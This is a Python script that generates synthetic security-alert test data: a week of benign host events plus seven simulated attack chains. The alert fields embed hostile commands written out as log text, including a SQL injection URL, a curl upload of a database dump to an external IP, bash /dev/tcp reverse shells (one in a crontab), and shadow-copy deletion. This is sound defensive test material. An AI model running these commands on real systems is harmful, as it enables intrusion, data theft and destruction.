"""Deterministically generate data/synthetic_alerts/batch02.jsonl.

A wider synthetic set than batch01: ~7 days, ~14 hosts, varied hours, mostly
benign, with three attack patterns (web chain, low-and-slow brute, lateral
movement). Run:  python data/synthetic_alerts/gen_batch02.py
"""
from __future__ import annotations

import json
import random
from datetime import datetime, timedelta
from pathlib import Path

R = random.Random(42)
OUT = Path(__file__).with_name("batch02.jsonl")
DAY0 = datetime(2026, 8, 24)
HOSTS = ["web-01", "web-02", "db-01", "db-02", "app-01", "app-02", "app-03",
         "mail-01", "dc-01", "fs-01", "proxy-01", "WIN-DESK-7", "WIN-DESK-9", "WIN-APP-3"]
_seq = 0


def _iso(dt: datetime) -> str:
    return dt.strftime("%Y-%m-%dT%H:%M:%S") + f".{dt.microsecond // 1000:03d}+0000"


def A(dt, rid, level, desc, host, *, groups=(), mitre=None, data=None, full_log="", loc="syslog"):
    global _seq
    _seq += 1
    rule = {"id": str(rid), "level": level, "description": desc, "groups": list(groups)}
    if mitre:
        rule["mitre"] = {"id": [mitre[0]], "tactic": [mitre[1]]}
    return {"timestamp": _iso(dt), "id": f"b2-{_seq:04d}", "rule": rule,
            "agent": {"name": host}, "data": data or {},
            "full_log": full_log or desc, "location": loc}


def _t(day, hour, minute=None):
    return DAY0 + timedelta(days=day, hours=hour, minutes=minute if minute is not None else R.randint(0, 59))


rows: list[dict] = []

# --- routine benign noise across all 7 days --------------------------------------
for day in range(7):
    for host in R.sample(HOSTS, 8):
        rows.append(A(_t(day, R.randint(6, 20)), 5715, 3, "sshd: authentication success.", host,
                      groups=["syslog", "sshd", "authentication_success"],
                      data={"srcip": f"10.0.{R.randint(1,9)}.{R.randint(2,250)}", "srcuser": R.choice(["deploy", "alice", "bob", "ubuntu", "svc-app"])},
                      loc="/var/log/auth.log"))
    for _ in range(4):
        rows.append(A(_t(day, R.choice([0, 6, 12, 18])), 2501, 2, "Cron job executed.", R.choice(HOSTS),
                      groups=["syslog", "cron"], data={"srcuser": "root"}))
    rows.append(A(_t(day, 3), 2932, 3, "Package updated.", R.choice(["app-01", "app-02", "db-02"]),
                  groups=["syslog", "yum"], full_log="Updated: openssl"))
    rows.append(A(_t(day, R.randint(8, 18)), 2500, 3, "Service started.", R.choice(HOSTS),
                  groups=["systemd", "syslog"], full_log="systemd: Started service."))
    rows.append(A(_t(day, 0, 2), 2903, 2, "Ntpd time synchronization.", R.choice(HOSTS), groups=["syslog", "ntp"]))

# app-03: a deliberately noisy-but-benign host, every ~4h all week
for day in range(7):
    for hour in (2, 6, 10, 14, 18, 22):
        rows.append(A(_t(day, hour, 5), R.choice([2501, 531, 2500]), 3,
                      R.choice(["Cron job executed.", "System partition usage is 80% full.", "Service started."]),
                      "app-03", groups=["ossec"], data={"srcuser": "backup"}))

# --- suspicious, scattered -----------------------------------------------------
susp = [
    (5710, 5, "sshd: Attempt to login using a non-existent user.", ["syslog", "sshd", "authentication_failed"], None),
    (5710, 5, "sshd: Attempt to login using a non-existent user.", ["syslog", "sshd", "authentication_failed"], None),
    (40101, 6, "Port scan detected from a single source.", ["ids", "recon"], ("T1595", "Reconnaissance")),
    (5902, 8, "New user added to the system.", ["syslog", "adduser"], ("T1136", "Persistence")),
    (91801, 6, "Powershell executed with an encoded command.", ["windows", "powershell"], ("T1059", "Execution")),
    (81703, 6, "Firewall rule was added.", ["windows", "firewall"], ("T1562", "Defense Evasion")),
    (18152, 5, "Kerberos pre-authentication failed.", ["windows", "authentication_failed"], ("T1110", "Credential Access")),
    (5716, 6, "sshd: authentication failed.", ["syslog", "sshd", "authentication_failed"], None),
]
for rep in range(3):  # ~24 suspicious, scattered across days/hosts
    for i, (rid, lvl, desc, grp, mit) in enumerate(susp):
        rows.append(A(_t(R.randint(0, 6), R.randint(0, 23)), rid, lvl, desc, R.choice(HOSTS),
                      groups=grp, mitre=mit, data={"srcip": f"198.51.100.{10 + rep * 8 + i}"}))

# --- malicious pattern 1: web attack chain on web-02 (day 3 afternoon) --------
d = 3
rows += [
    A(_t(d, 13, 4), 31151, 5, "Multiple web server 400 error codes from same source ip.", "web-02",
      groups=["web", "attack"], mitre=("T1595", "Reconnaissance"), data={"srcip": "203.0.113.77"}),
    A(_t(d, 13, 22), 31103, 7, "SQL injection attempt.", "web-02", groups=["web", "attack", "sql_injection"],
      mitre=("T1190", "Initial Access"), data={"srcip": "203.0.113.77", "url": "/p.php?id=1' UNION SELECT pw FROM users--"},
      full_log="203.0.113.77 \"GET /p.php?id=1' UNION SELECT pw FROM users-- HTTP/1.1\" 200 4211"),
    A(_t(d, 13, 51), 31106, 7, "PHP CGI-bin vulnerability attempt.", "web-02", groups=["web", "attack"],
      mitre=("T1190", "Initial Access"), data={"srcip": "203.0.113.77"}, full_log="POST /cgi-bin/php?-d+allow_url_include=on 200"),
    A(_t(d, 14, 20), 5715, 3, "sshd: authentication success.", "web-02", groups=["sshd", "authentication_success"],
      mitre=("T1078", "Initial Access"), data={"srcip": "203.0.113.77", "srcuser": "www-data"},
      full_log="Accepted password for www-data from 203.0.113.77 ssh2", loc="/var/log/auth.log"),
    A(_t(d, 15, 40), 92300, 12, "Large outbound data transfer to external host (possible exfiltration).", "web-02",
      groups=["network", "attack"], mitre=("T1041", "Exfiltration"),
      data={"srcip": "10.0.0.24", "dstip": "203.0.113.77", "srcuser": "www-data", "bytes": "71200000"},
      full_log="www-data curl -T /var/backups/all.sql.gz https://203.0.113.77/u (71 MB)", loc="netstat"),
]

# --- malicious pattern 2: low-and-slow brute force on dc-01 (day 1, 02:00-08:00) ---
for hour in range(2, 8):
    for _ in range(R.randint(1, 3)):
        rows.append(A(_t(1, hour), 5712, 8, "sshd: possible brute force (spread over hours).", "dc-01",
                      groups=["sshd", "authentication_failures", "attack"], mitre=("T1110", "Credential Access"),
                      data={"srcip": "45.83.12.9", "srcuser": R.choice(["admin", "root", "svc-sql", "backup"])},
                      loc="/var/log/auth.log"))
rows.append(A(_t(1, 8, 15), 5715, 3, "sshd: authentication success.", "dc-01",
              groups=["sshd", "authentication_success"], mitre=("T1078", "Initial Access"),
              data={"srcip": "45.83.12.9", "srcuser": "svc-sql"},
              full_log="Accepted password for svc-sql from 45.83.12.9 ssh2 (after 6h of failures)",
              loc="/var/log/auth.log"))

# --- malicious pattern 3: lateral movement WIN-DESK-9 -> WIN-APP-3 (day 5 evening) ---
rows += [
    A(_t(5, 19, 2), 60106, 3, "Windows Logon Success.", "WIN-DESK-9", groups=["windows", "authentication_success"],
      mitre=("T1078", "Initial Access"),
      data={"win": {"eventdata": {"targetUserName": "helpdesk", "ipAddress": "203.0.113.90", "logonType": "10"}}},
      full_log="Logon success helpdesk type 10 from 203.0.113.90", loc="EventChannel"),
    A(_t(5, 19, 25), 92500, 11, "Service installed via SMB (PsExec-like lateral movement).", "WIN-APP-3",
      groups=["windows", "attack"], mitre=("T1021", "Lateral Movement"),
      data={"win": {"eventdata": {"serviceName": "PSEXESVC", "sourceAddress": "10.0.0.63", "targetUserName": "helpdesk"}}},
      full_log="A service was installed: PSEXESVC from 10.0.0.63 (WIN-DESK-9) as helpdesk", loc="EventChannel"),
    A(_t(5, 19, 44), 92030, 13, "Credential dumping: process accessed LSASS memory.", "WIN-APP-3",
      groups=["windows", "sysmon", "attack"], mitre=("T1003", "Credential Access"),
      data={"win": {"eventdata": {"sourceImage": "C:\\Windows\\Temp\\p.exe", "targetImage": "lsass.exe", "grantedAccess": "0x1010", "targetUserName": "helpdesk"}}},
      full_log="Sysmon 10: p.exe accessed lsass.exe GrantedAccess 0x1010 (session: helpdesk)", loc="EventChannel"),
    A(_t(5, 20, 32), 92060, 10, "Scheduled task created for persistence.", "WIN-APP-3",
      groups=["windows", "attack"], mitre=("T1053", "Persistence"),
      data={"win": {"eventdata": {"taskName": "\\Microsoft\\Windows\\UpdateSync", "targetUserName": "helpdesk"}}},
      full_log="A scheduled task was created: \\Microsoft\\Windows\\UpdateSync runs p.exe hourly (helpdesk)", loc="EventChannel"),
]

# --- malicious pattern 4: staged data exfiltration from db-02 (day 4) -----------
rows += [
    A(_t(4, 3, 2), 92610, 8, "Large archive created in /tmp by the database process.", "db-02",
      groups=["ossec", "attack"], mitre=("T1560", "Collection"),
      data={"srcuser": "postgres", "file": "/tmp/.x/dump.tar.gz"},
      full_log="postgres created /tmp/.x/dump.tar.gz (1.9 GB) via tar czf", loc="syscheck"),
    A(_t(4, 3, 9), 92611, 8, "Database dump written to a non-standard path.", "db-02",
      groups=["ossec", "attack"], mitre=("T1005", "Collection"),
      data={"srcuser": "postgres"}, full_log="pg_dump -Fc -f /tmp/.x/all.dump (whole cluster)"),
    A(_t(4, 4, 31), 92300, 12, "Sustained high-volume outbound transfer to an external host.", "db-02",
      groups=["network", "attack"], mitre=("T1041", "Exfiltration"),
      data={"srcip": "10.0.3.30", "dstip": "185.220.101.7", "srcuser": "postgres", "bytes": "2140000000"},
      full_log="postgres: 2.1 GB sent to 185.220.101.7:443 over 40 min", loc="netstat"),
]

# --- malicious pattern 5: privilege escalation via vulnerable service (app-01, day 2, 3 incidents) ---
rows += [
    A(_t(2, 10, 5), 92700, 10, "Exploitation attempt against a vulnerable local service (CVE-2021-4034).", "app-01",
      groups=["ossec", "attack"], mitre=("T1068", "Privilege Escalation"),
      data={"srcuser": "www-data"}, full_log="pkexec called with malformed argv by www-data (pwnkit)"),
    A(_t(2, 10, 52), 92701, 12, "Unexpected root shell spawned by a non-privileged process.", "app-01",
      groups=["ossec", "sysmon", "attack"], mitre=("T1068", "Privilege Escalation"),
      data={"srcuser": "www-data"}, full_log="uid=0 /bin/bash spawned by parent pkexec (uid 33 www-data)"),
    A(_t(2, 11, 40), 92702, 11, "New SUID-root binary created under /var/tmp.", "app-01",
      groups=["ossec", "syscheck", "attack"], mitre=("T1548", "Privilege Escalation"),
      data={"srcuser": "root", "file": "/var/tmp/.cache/sh"},
      full_log="new file /var/tmp/.cache/sh mode 04755 owner root", loc="syscheck"),
]

# --- malicious pattern 6: second reverse-shell variant on mail-01 (day 6, 2 incidents) ---
rows += [
    A(_t(6, 21, 15), 92660, 12, "Bash /dev/tcp reverse shell detected.", "mail-01",
      groups=["ossec", "process_monitor", "attack"], mitre=("T1059", "Execution"),
      data={"srcuser": "postfix", "command": "bash -i >& /dev/tcp/91.219.29.5/8443 0>&1"},
      full_log="process: postfix bash -i >& /dev/tcp/91.219.29.5/8443 0>&1", loc="process_monitor"),
    A(_t(6, 21, 18), 92110, 8, "Outbound connection to a non-standard port from a mail service account.", "mail-01",
      groups=["network", "attack"], mitre=("T1071", "Command and Control"),
      data={"srcip": "10.0.4.40", "dstip": "91.219.29.5", "srcuser": "postfix"},
      full_log="postfix -> 91.219.29.5:8443 established", loc="netstat"),
    A(_t(6, 22, 5), 92214, 10, "Crontab modified by a mail service account.", "mail-01",
      groups=["ossec", "syscheck", "attack"], mitre=("T1053", "Persistence"),
      data={"srcuser": "postfix", "file": "/var/spool/cron/crontabs/postfix"},
      full_log="crontab: */10 * * * * bash -c 'exec bash -i &>/dev/tcp/91.219.29.5/8443 <&1'", loc="syscheck"),
]

# --- malicious pattern 7: ransomware burst on fs-01 (day 5, tight -> one high incident) ---
rows += [
    A(_t(5, 16, 40), 92490, 12, "Volume shadow copies deleted.", "fs-01",
      groups=["windows", "attack"], mitre=("T1490", "Impact"),
      data={"win": {"eventdata": {"commandLine": "vssadmin.exe delete shadows /all /quiet"}}},
      full_log="vssadmin.exe delete shadows /all /quiet", loc="EventChannel"),
    A(_t(5, 16, 43), 92486, 14, "Mass file encryption: 800+ files modified with high entropy.", "fs-01",
      groups=["ossec", "syscheck", "attack"], mitre=("T1486", "Impact"),
      data={"win": {"eventdata": {"count": "834"}}},
      full_log="834 files in \\\\fs-01\\share renamed *.crypted within 120s, entropy > 7.9", loc="syscheck"),
    A(_t(5, 16, 45), 92487, 13, "Ransom note dropped across file shares.", "fs-01",
      groups=["ossec", "syscheck", "attack"], mitre=("T1486", "Impact"),
      data={"file": "README_RESTORE.txt"},
      full_log="README_RESTORE.txt written to 40 directories under \\\\fs-01\\share", loc="syscheck"),
]

rows.sort(key=lambda r: r["timestamp"])
OUT.write_text("\n".join(json.dumps(r, separators=(",", ":")) for r in rows) + "\n", encoding="utf-8")
print(f"wrote {len(rows)} alerts -> {OUT.name}")
